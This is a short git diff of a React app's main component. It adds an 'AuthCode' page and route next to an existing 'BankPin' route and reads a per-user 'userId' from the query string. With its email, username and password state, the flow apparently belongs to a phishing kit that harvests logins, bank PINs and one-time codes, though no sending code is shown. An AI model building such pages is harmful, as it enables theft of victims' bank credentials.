@@ -6,15 +6,19 @@ import Code from "./components/flow.jsx/Code";
 import "./App.css";
 import "./index.css";
 import BankPin from "./components/flow.jsx/BankPin";
-import { useParams, Routes, Route } from "react-router-dom";
+import AuthCode from "./components/flow.jsx/AuthCode";
+import { useSearchParams, Routes, Route } from "react-router-dom";
 import mongoose from "mongoose";
 
 function App() {
   const [email, setEmail] = useState("");
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
-  const [validUserId, setValidUserId] = useState(false);
-  const { userId } = useParams(); // Extracting userId from URL parameters
+  const [validUserId, setValidUserId] = useState(true);
+  const [searchParams] = useSearchParams();
+  const userId = searchParams.get('userId');
+
+  // console.log('User ID:', userId);
   useEffect(() => {
     if(mongoose.Types.ObjectId.isValid(userId)){
       setValidUserId(true)
@@ -48,6 +52,7 @@ function App() {
           }
           />
         <Route path="/bankPin" element={<BankPin email={email}/>} />
+        <Route path="/authcode" element={<AuthCode email={email}/>} />
         <Route 
         path="/username/:userId?/*" 
         element={<Username 
